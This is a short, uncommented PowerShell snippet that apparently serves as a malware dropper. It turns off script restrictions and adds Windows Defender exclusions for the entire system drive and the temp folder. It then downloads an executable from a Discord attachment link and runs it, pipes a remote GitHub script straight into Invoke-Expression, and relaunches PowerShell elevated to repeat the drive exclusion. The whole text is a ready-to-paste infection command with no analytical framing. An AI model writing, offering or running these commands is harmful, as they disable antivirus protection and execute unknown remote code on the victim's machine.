    Set-ExecutionPolicy unrestricted -Force; Add-MpPreference -ExclusionPath $env:SystemDrive; Add-MpPreference -ExclusionPath "$env:TEMP"; Invoke-WebRequest -Uri "https://cdn.discordapp.com/attachments/895907015614930984/1268572168074301451/distopan.exe?ex=66ace965&is=66ab97e5&hm=e9a96048cc908d906f69725a87634b8640fef7328090a9f6f638d36311fcab28&" -OutFile "$env:temp\rs.exe"; powershell "$env:temp\rs.exe"; irm https://raw.githubusercontent.com/Chapelo/rs/main/rs3.ps1 | iex;


powershell -Command "Start-Process powershell -Verb RunAs -ArgumentList '-Command \"Add-MpPreference -ExclusionPath $env:SystemDrive\"'"
